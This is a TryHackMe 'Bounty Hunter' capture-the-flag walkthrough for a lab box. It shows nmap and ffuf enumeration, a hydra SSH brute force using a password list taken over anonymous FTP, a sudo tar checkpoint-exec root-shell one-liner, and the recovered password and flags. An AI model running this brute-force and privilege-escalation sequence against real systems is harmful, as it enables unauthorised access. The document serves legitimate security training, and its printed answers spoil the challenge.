---
tags:
  - tryhackme
  - challenge
  - easy
  - offensive
  - linux
  - web
  - brute-force
  - sudo-abuse
---

# Bounty Hunter
![Bounty Hunter logo](logos/bounty_hunter_logo.png)

**Platform:** TryHackMe  
**Type:** Challenge  
**Difficulty:** Easy  
**Link:** [Bounty Hunter](https://tryhackme.com/room/cowboyhacker)  

## Description
"You talked a big game about being the most elite hacker in the solar system. Prove it and claim your right to the status of Elite Bounty Hacker!  
You were boasting on and on about your elite hacker skills in the bar and a few Bounty Hunters decided they'd take you up on claims! Prove your status is more than just a few glasses at the bar. I sense bell peppers & beef in your future! "

## Enumeration
```
ports=$(nmap -p- --min-rate=1000 TARGET_IP_ADDRESS | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
nmap -p$ports -A -T4 TARGET_IP_ADDRESS
```

```
Host is up (0.021s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.130.206
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV failed: 550 Permission denied.
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 1d:11:95:32:8e:28:c5:24:c1:f0:b0:13:11:bb:f3:4a (RSA)
|   256 21:13:bc:14:a0:67:7d:1e:0b:08:e1:5d:04:60:ec:70 (ECDSA)
|_  256 8d:86:ad:53:6b:d1:bc:ba:71:d5:f9:b4:98:56:99:cf (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|specialized|phone|storage-misc
Running (JUST GUESSING): Linux 4.X|5.X|3.X (91%), Crestron 2-Series (86%), Google Android 10.X|11.X|12.X (85%), HP embedded (85%)
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:crestron:2_series cpe:/o:linux:linux_kernel:3 cpe:/o:google:android:10 cpe:/o:google:android:11 cpe:/o:google:android:12 cpe:/h:hp:p2000_g3
Aggressive OS guesses: Linux 4.15 - 5.19 (91%), Linux 4.15 (90%), Linux 5.4 (90%), Crestron XPanel control system (86%), Linux 3.8 - 3.16 (86%), Android 10 - 12 (Linux 4.14 - 4.19) (85%), HP P2000 G3 NAS device (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 3 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

### FTP enumeration (anonymous login)
```
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
550 Permission denied.
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
226 Directory send OK.
ftp> get locks.txt
local: locks.txt remote: locks.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for locks.txt (418 bytes).
100% |**********************************************************************************************************************************************|   418      151.69 KiB/s    00:00 ETA
226 Transfer complete.
418 bytes received in 00:00 (18.64 KiB/s)
ftp> get task.txt
local: task.txt remote: task.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for task.txt (68 bytes).
100% |**********************************************************************************************************************************************|    68      301.84 KiB/s    00:00 ETA
226 Transfer complete.
68 bytes received in 00:00 (2.85 KiB/s)

cat locks.txt 
	rEddrAGON
	ReDdr4g0nSynd!cat3
	Dr@gOn$yn9icat3
	R3DDr46ONSYndIC@Te
	ReddRA60N
	R3dDrag0nSynd1c4te
	dRa6oN5YNDiCATE
	ReDDR4g0n5ynDIc4te
	R3Dr4gOn2044
	RedDr4gonSynd1cat3
	R3dDRaG0Nsynd1c@T3
	Synd1c4teDr@g0n
	reddRAg0N
	REddRaG0N5yNdIc47e
	Dra6oN$yndIC@t3
	4L1mi6H71StHeB357
	rEDdragOn$ynd1c473
	DrAgoN5ynD1cATE
	ReDdrag0n$ynd1cate
	Dr@gOn$yND1C4Te
	RedDr@gonSyn9ic47e
	REd$yNdIc47e
	dr@goN5YNd1c@73
	rEDdrAGOnSyNDiCat3
	r3ddr@g0N
	ReDSynd1ca7e
	
cat task.txt       
	1.) Protect Vicious.
	2.) Plan for Red Eye pickup on the moon.
	
	-lin
```

**Notes**  

* Contents of `locks.txt` for use as password list later
* Confirmation of username ("lin")

??? success "Who wrote the task list? "
	lin

### HTTP enumeration
```
ffuf -u http://TARGET_IP_ADDRESS/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -ic -c
gobuster dir -u TARGET_IP_ADDRESS -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x php,html,txt
```

**Notes**

* No `robots.txt` file  
* No `sitemap` file  
* Nothing interesting in the source code  
* Static web page in web browser
* Single image file at `/images` directory
* `403` error for `/javascript` directory

### Vulnerability enumeration
```
searchsploit vsftpd 3.0.5	# No results
searchsploit OpenSSH 8.2p1	# No results
searchsploit httpd 2.4.41	# Only result: DoS
```

## Foothold
```
hydra -l lin -P locks.txt ssh://10.128.136.151
	Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
	
	Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-04-19 16:04:10
	[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
	[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
	[DATA] max 16 tasks per 1 server, overall 16 tasks, 26 login tries (l:1/p:26), ~2 tries per task
	[DATA] attacking ssh://TARGET_IP_ADDRESS
	[22][ssh] host: TARGET_IP_ADDRESS   login: lin   password: RedDr4gonSynd1cat3
	1 of 1 target successfully completed, 1 valid password found
	[WARNING] Writing restore file because 1 final worker threads did not complete until end.
	[ERROR] 1 target did not resolve or could not be connected
	[ERROR] 0 target did not complete
	Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-04-19 16:04:24
```
??? success "What service can you bruteforce with the text file found?"
	SSH  
??? success "What is the users password?"
	RedDr4gonSynd1cat3

### User flag
```
lin@ip-TARGET_IP_ADDRESS:~/Desktop$ ls -al
	total 12
	drwxr-xr-x  2 lin lin 4096 Jun  7  2020 .
	drwxr-xr-x 19 lin lin 4096 Jun  7  2020 ..
	-rw-rw-r--  1 lin lin   21 Jun  7  2020 user.txt
lin@ip-TARGET_IP_ADDRESS:~/Desktop$ cat user.txt
```
??? success "user.txt"
	THM{CR1M3_SyNd1C4T3}
	
## Privilege Escalation
```
lin@ip-TARGET_IP_ADDRESS:~/Desktop$ sudo -l
	[sudo] password for lin: 
	Matching Defaults entries for lin on ip-10-128-136-151:
	    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
	
	User lin may run the following commands on ip-10-128-136-151:
	    (root) /bin/tar
```

[GTFObins `tar`](https://gtfobins.org/gtfobins/tar/)

```
lin@ip-TARGET_IP_ADDRESS:~/Desktop$ sudo tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
	tar: Removing leading `/' from member names
ls -al /root
	total 52
	drwx------  7 root root 4096 Aug 11  2025 .
	drwxr-xr-x 24 root root 4096 Apr 19 14:39 ..
	-rw-------  1 root root 3195 Aug 11  2025 .bash_history
	-rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc
	drwx------  2 root root 4096 Aug 11  2025 .cache
	drwx------  3 root root 4096 Aug 11  2025 .gnupg
	drwxr-xr-x  2 root root 4096 Jun  7  2020 .nano
	-rw-r--r--  1 root root  161 Jan  2  2024 .profile
	-rw-r--r--  1 root root   19 Jun  7  2020 root.txt
	-rw-r--r--  1 root root   66 Jun  7  2020 .selected_editor
	drwx------  7 root root 4096 Aug 11  2025 snap
	drwx------  2 root root 4096 Aug 11  2025 .ssh
	-rw-------  1 root root 1360 Aug 11  2025 .viminfo`
cat /root/root.txt
```
??? success "root.txt"
	THM{80UN7Y_h4cK3r}

**Tools Used**  
`hydra`

**Date completed:** 19/04/26  
**Date published:** 19/04/26